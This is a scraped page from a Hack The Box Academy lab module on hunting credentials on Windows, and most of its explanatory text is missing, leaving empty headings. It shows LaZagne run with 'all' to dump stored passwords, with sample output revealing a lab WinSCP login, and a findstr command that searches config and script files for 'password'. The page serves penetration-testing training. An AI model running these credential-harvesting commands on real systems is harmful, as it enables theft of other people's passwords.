<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/147/section/1318
// Platform Version: V1
// Module ID: 147
// Module Name: Password Attacks
// Module Difficulty: Medium
// Section ID: 1318
// Section Title: Credential Hunting in Windows
// Page Title: Password Attacks
// Page Number: 10
-->

# Credential Hunting in Windows

**Module Name:** Password Attacks **Page Number:** 10

#### PASSWORD ATTACKS

# Credential Hunting in Windows

## Search Centric

#### Key Terms to Search

## Search Tools

![https://academy.hackthebox.com/storage/modules/147/WindowsSearch.png](https://academy.hackthebox.com/storage/modules/147/WindowsSearch.png)

#### Running Lazagne All

``` cmd-session
C:\Users\bob\Desktop> start lazagne.exe all
```

#### Lazagne Output

``` cmd-session
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

#### Using findstr

``` cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Additional Considerations

# 

# 

#### Questions

####